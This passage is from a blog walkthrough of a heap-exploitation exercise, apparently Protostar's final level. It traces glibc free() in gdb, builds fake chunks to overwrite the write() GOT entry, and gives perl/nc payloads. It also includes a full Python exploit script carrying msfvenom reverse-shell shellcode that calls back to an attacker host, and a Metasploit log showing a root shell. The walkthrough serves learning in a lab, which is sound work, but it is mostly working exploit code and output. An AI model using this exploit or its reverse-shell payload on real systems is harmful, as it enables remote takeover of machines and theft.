0x804aaad &lt;free+235&gt;:	cmp    eax,DWORD PTR [ebp-0x28] ; start of next chunk
0x804aab0 &lt;free+238&gt;:	je     0x804ab54 &lt;free+402&gt;</code></pre></div>

<p>Dunno, probably verifies the calculated start of next chunk.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aab6 &lt;free+244&gt;:	mov    eax,DWORD PTR [ebp-0x24] ; size of next chunk
0x804aab9 &lt;free+247&gt;:	mov    edx,DWORD PTR [ebp-0x28] ; start of next chunk
0x804aabc &lt;free+250&gt;:	lea    eax,[edx+eax*1]          ; next_next chunk
0x804aabf &lt;free+253&gt;:	mov    eax,DWORD PTR [eax+0x4]  ; size of next_next chunk
0x804aac2 &lt;free+256&gt;:	and    eax,0x1
0x804aac5 &lt;free+259&gt;:	mov    DWORD PTR [ebp-0x20],eax
...
0x804aad1 &lt;free+271&gt;:	cmp    DWORD PTR [ebp-0x20],0x0
0x804aad5 &lt;free+275&gt;:	jne    0x804ab01 &lt;free+319&gt;</code></pre></div>

<p>Here the <em>PREV_INUSE</em> flag of the next_next chunk is checked.
Afterwards the FD and BK pointers of the next chunk are written to their counterparts.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x804aad7 &lt;free+277&gt;:	mov    eax,DWORD PTR [ebp-0x28] ; start of next chunk
0x804aada &lt;free+280&gt;:	mov    eax,DWORD PTR [eax+0x8]  ; FD of next chunk
0x804aadd &lt;free+283&gt;:	mov    DWORD PTR [ebp-0x14],eax
0x804aae0 &lt;free+286&gt;:	mov    eax,DWORD PTR [ebp-0x28] ; start of next chunk
0x804aae3 &lt;free+289&gt;:	mov    eax,DWORD PTR [eax+0xc]  ; BK of next chunk
0x804aae6 &lt;free+292&gt;:	mov    DWORD PTR [ebp-0x18],eax
0x804aae9 &lt;free+295&gt;:	mov    eax,DWORD PTR [ebp-0x14] ; FD of next chunk
0x804aaec &lt;free+298&gt;:	mov    edx,DWORD PTR [ebp-0x18] ; BK of next chunk
0x804aaef &lt;free+301&gt;:	mov    DWORD PTR [eax+0xc],edx
0x804aaf2 &lt;free+304&gt;:	mov    eax,DWORD PTR [ebp-0x18] ; BK of next chunk
0x804aaf5 &lt;free+307&gt;:	mov    edx,DWORD PTR [ebp-0x14] ; FD of next chunk
0x804aaf8 &lt;free+310&gt;:	mov    DWORD PTR [eax+0x8],edx</code></pre></div>

<p>If we can execute this code path, we can overwrite a pointer in e.g. the GOT.
In order to do this, the next_next chunk must have a PREV_INUSE flag of zero.</p>

<p>In this example we control the next chunk header.
We only need to introduce a next_next chunk with above mentioned flag set.
With a negative size for the next chunk we avoid null bytes and can create a virtual chunk in the first part of the input.</p>

<h2 id="exploitation-4">Exploitation</h2>

<p>Let&rsquo;s test the approach with the following code.
Let&rsquo;s just try with the payload from Heap3.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">#perl -e &#39;print(&#34;FSRD&#34;.&#34;A&#34;x123 .&#34;/&#34;.&#34;FSRDROOT&#34;.&#34;B&#34;x103 .&#34;/\xFC\xFF\xFF\xFF\xFC\xFF\xFF\xFFCCCCDDDD&#34;)&#39; | nc 192.168.1.6 2993</code></pre></div>

<p>With this input we expect a segmentation fault when the second chunk is free()d.
Let&rsquo;s see what gdb says.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">--------------------------------------------------------------------------[regs]
  EAX: 0x43434343  EBX: 0xB7FD7FF4  ECX: 0x0804C2D6  EDX: 0x44444444  o d I t s Z a P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF248  ESP: 0xBFFFF200  EIP: 0x0804AAEF
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
0x804aaef &lt;free+301&gt;:	mov    DWORD PTR [eax+0xc],edx
0x804aaf2 &lt;free+304&gt;:	mov    eax,DWORD PTR [ebp-0x18]
0x804aaf5 &lt;free+307&gt;:	mov    edx,DWORD PTR [ebp-0x14]
0x804aaf8 &lt;free+310&gt;:	mov    DWORD PTR [eax+0x8],edx
0x804aafb &lt;free+313&gt;:	mov    eax,DWORD PTR [ebp-0x24]
0x804aafe &lt;free+316&gt;:	add    DWORD PTR [ebp-0x30],eax
0x804ab01 &lt;free+319&gt;:	mov    eax,DWORD PTR [ebp-0x38]
0x804ab04 &lt;free+322&gt;:	add    eax,0x34
--------------------------------------------------------------------------------</code></pre></div>

<p>Great!
So we need to figure out what pointers to overwrite.
A write() call is executed just before the free().
We can overwrite the GOT with our address.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">gdb$ x/3i 0x8048dfc
0x8048dfc &lt;write@plt&gt;:	jmp    DWORD PTR ds:0x804d41c
0x8048e02 &lt;write@plt+6&gt;:	push   0x68
0x8048e07 &lt;write@plt+11&gt;:	jmp    0x8048d1c
gdb$ x/x 0x804d41c
0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:	0xb7f53c70</code></pre></div>

<p>For best results, we can utilize a third chunk as our target buffer.
Just append some more bytes to the input command.
The respective heap address is as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">gdb$ disas chex/34x  0x0804E118-8
0x804e110:	0x00000000	0x00000089	0x44525346	0xcccccccc
0x804e120:	0xcccccccc	0xcccccccc	0x0804d410	0xcccccccc
0x804e130:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e140:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e150:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e160:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e170:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e180:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
0x804e190:	0xcccccccc	0x00cccccc</code></pre></div>

<p>We update the BK pointer in our command to direct the execution into chunk three.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">#perl -e &#39;print(&#34;FSRD&#34;.&#34;A&#34;x108 .&#34;\xF0\xFF\xFF\xFF&#34;.&#34;\xFC\xFF\xFF\xFF&#34;.&#34;EEEE&#34;.&#34;FFF&#34; .&#34;/&#34;.&#34;FSRDROOT&#34;.&#34;B&#34;x103 .&#34;/\xFC\xFF\xFF\xFF\xF0\xFF\xFF\xFF&#34;.&#34;\x10\xD4\x04\x08&#34;.&#34;\x20\xE1\x04\x08&#34;. &#34;FSRD&#34;.&#34;\xCC&#34;x128)&#39; | nc 192.168.1.6 299</code></pre></div>

<p>And with this command the execution hopefully stops with a SIGTRAP instruction.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Program received signal SIGTRAP, Trace/breakpoint trap.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000004  EBX: 0xB7FD7FF4  ECX: 0x0804C2D6  EDX: 0x0804E078  o d I t S z A p C
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF678  ESP: 0xBFFFF24C  EIP: 0x0804E121
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
0x804e121:	int3   
0x804e122:	int3   
0x804e123:	int3   
--------------------------------------------------------------------------------
0x0804e121 in ?? ()</code></pre></div>

<p>Next, we need to introduce a jmp over BK+8 where the pointer to 0x0804d410 will be written.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">perl -e &#39;print(&#34;FSRD&#34;.&#34;A&#34;x108 .&#34;\xF0\xFF\xFF\xFF&#34;.&#34;\xFC\xFF\xFF\xFF&#34;.&#34;EEEE&#34;.&#34;FFF&#34; .&#34;/&#34;.&#34;FSRDROOT&#34;.&#34;B&#34;x103 .&#34;/\xFC\xFF\xFF\xFF\xF0\xFF\xFF\xFF&#34;.&#34;\x10\xD4\x04\x08&#34;.&#34;\x20\xE1\x04\x08&#34;. &#34;FSRD&#34;.&#34;\x90&#34;x10 .&#34;\xEB\x04&#34;.&#34;XXXX&#34;.&#34;\x90&#34;x100 .&#34;\xCC&#34;)&#39; | nc 192.168.1.6 2993</code></pre></div>

<p>And finally, we place a shellcode in the chunk3.
The reverse shell from the last example fits fine into the third junk.</p>

<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="ch">#!/usr/bin/python</span>
<span class="ln"> 2</span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="ln"> 3</span>
<span class="ln"> 4</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="ln"> 5</span><span class="kn">import</span> <span class="nn">struct</span>
<span class="ln"> 6</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="ln"> 7</span>
<span class="ln"> 8</span><span class="c1">#TARGET</span>
<span class="ln"> 9</span><span class="n">target_ip</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;192.168.1.6&#34;</span>
<span class="ln">10</span><span class="n">target_port</span> <span class="o">=</span> <span class="mi">2993</span>
<span class="ln">11</span>
<span class="ln">12</span><span class="c1">#target addre#$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f python -e x86/shikata_ga_nai</span>
<span class="ln">13</span><span class="n">shellcode</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
<span class="ln">14</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xba\xe7\x96\xde\xe9\xda\xce\xd9\x74\x24\xf4\x5b\x2b</span><span class="s2">&#34;</span>
<span class="ln">15</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x12\x31\x53\x12\x83\xc3\x04\x03\xb4\x98\x3c</span><span class="s2">&#34;</span>
<span class="ln">16</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x1c\x0b\x7e\x37\x3c\x38\xc3\xeb\xa9\xbc\x4a\xea\x9e</span><span class="s2">&#34;</span>
<span class="ln">17</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xa6\x81\x6d\x4d\x7f\xaa\x51\xbf\xff\x83\xd4\xc6\x97</span><span class="s2">&#34;</span>
<span class="ln">18</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xd3\x8f\x38\x65\xbc\xcd\x3a\x78\x60\x5b\xdb\xca\xfe</span><span class="s2">&#34;</span>
<span class="ln">19</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x0b\x4d\x79\x4c\xa8\xe4\x9c\x7f\x2f\xa4\x36\xaf\x1f</span><span class="s2">&#34;</span>
<span class="ln">20</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x3a\xae\xc7\x70\xde\x47\x76\x06\xfd\xc5\xd5\x91\xe3</span><span class="s2">&#34;</span>
<span class="ln">21</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x59\xd2\x6c\x63</span><span class="s2">&#34;</span>
<span class="ln">22</span>
<span class="ln">23</span><span class="n">vchunk</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xF0\xFF\xFF\xFF</span><span class="s2">&#34;</span>
<span class="ln">24</span><span class="n">vchunk</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xFC\xFF\xFF\xFF</span><span class="s2">&#34;</span>
<span class="ln">25</span><span class="n">vchunk</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;BBBB&#34;</span> <span class="c1">#FD</span>
<span class="ln">26</span><span class="n">vchunk</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;CCC&#34;</span> <span class="c1">#BK (for alignment on byte short)</span>
<span class="ln">27</span>
<span class="ln">28</span><span class="n">payload1</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;FSRD&#34;</span>
<span class="ln">29</span><span class="n">payload1</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">vchunk</span><span class="p">))</span>
<span class="ln">30</span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">vchunk</span>
<span class="ln">31</span><span class="n">payload1</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;/&#34;</span>
<span class="ln">32</span>
<span class="ln">33</span><span class="n">FD</span> <span class="o">=</span> <span class="mh">0x804D41C</span> <span class="c1">#write()</span>
<span class="ln">34</span><span class="n">BK</span> <span class="o">=</span> <span class="mh">0x804E120</span> <span class="c1">#write()</span>
<span class="ln">35</span><span class="n">chunk</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xFC\xFF\xFF\xFF</span><span class="s2">&#34;</span>
<span class="ln">36</span><span class="n">chunk</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xF0\xFF\xFF\xFF</span><span class="s2">&#34;</span>
<span class="ln">37</span><span class="n">chunk</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">FD</span><span class="o">-</span><span class="mh">0xc</span><span class="p">)</span> <span class="c1">#FD -0xc in free</span>
<span class="ln">38</span><span class="n">chunk</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">BK</span><span class="p">)</span> <span class="c1">#BK</span>
<span class="ln">39</span>
<span class="ln">40</span><span class="n">payload2</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;FSRD&#34;</span>
<span class="ln">41</span><span class="n">payload2</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;ROOT&#34;</span>
<span class="ln">42</span><span class="n">payload2</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="ln">43</span><span class="n">payload2</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;/&#34;</span>
<span class="ln">44</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">chunk</span>
<span class="ln">45</span>
<span class="ln">46</span><span class="n">payload3</span> <span class="o">=</span>  <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">14</span>
<span class="ln">47</span><span class="n">payload3</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xEB\x04</span><span class="s2">&#34;</span> <span class="c1">#JMP 4</span>
<span class="ln">48</span><span class="n">payload3</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;XXXX&#34;</span>     <span class="c1">#FD will be written to this location</span>
<span class="ln">49</span><span class="k">print</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="ln">50</span><span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="ln">51</span><span class="n">payload3</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="ln">52</span><span class="n">payload3</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="ln">53</span><span class="n">payload3</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xcc</span><span class="s2">&#34;</span>
<span class="ln">54</span>
<span class="ln">55</span>
<span class="ln">56</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">:</span>
<span class="ln">57</span>  <span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;Exploit code too large&#34;</span><span class="p">)</span>
<span class="ln">58</span>  <span class="nb">exit</span><span class="p">()</span>
<span class="ln">59</span>
<span class="ln">60</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span> <span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
<span class="ln">61</span><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
<span class="ln">62</span><span class="k">if</span> <span class="n">sock</span><span class="p">:</span>
<span class="ln">63</span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload1</span><span class="p">))</span>
<span class="ln">64</span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="ln">65</span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
<span class="ln">66</span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
<span class="ln">67</span>  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload3</span><span class="p">))</span>
<span class="ln">68</span>  <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span></code></pre></div>

<p>Now we only have to wait for a reverse connection.</p>

<p><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfcli exploit/multi/handler payload=linux/x86/shell_reverse_tcp lport=4444  E
[*] Initializing modules...
payload =&gt; linux/x86/shell_reverse_tcp
lport =&gt; 4444
[*] Started reverse handler on 0.0.0.0:4444
[*] Starting the payload handler...
[*] Command shell session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.6:49839) at 2015-07-04 11:15:03 +0200

whoami
root
python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
# pwd
pwd
/</code></pre></div></p>

<h1 id="acknowledgements">Acknowledgements</h1>

<p>Finally, a big thanks to the creators of the protostar exploit exercises.
The challenges present quite a steep learning curve.
A great curse to try harder each exercise.</p>

<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-final/">TheSprawl - protostar - final levels</a></li>
<li><a href="http://www.kroosec.com/search/label/exploit-exercises">Hani&rsquo;s blog - exploit-exercises</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2015/07/Offensive-Security-Certified-Expert/"> Offensive Security Certified Expert</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Heap-levels/"> Exploit Exercises - Protostar - Heap levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://camelinc.info//js/jquery-2.1.4.js"></script>

  <script src="http://camelinc.info//js/bootstrap.min.js"></script>
  <script src="http://camelinc.info//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://camelinc.info//js/hc.js"></script>

  
  <script type="text/javascript" src="http://camelinc.info//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	</body>
</html>
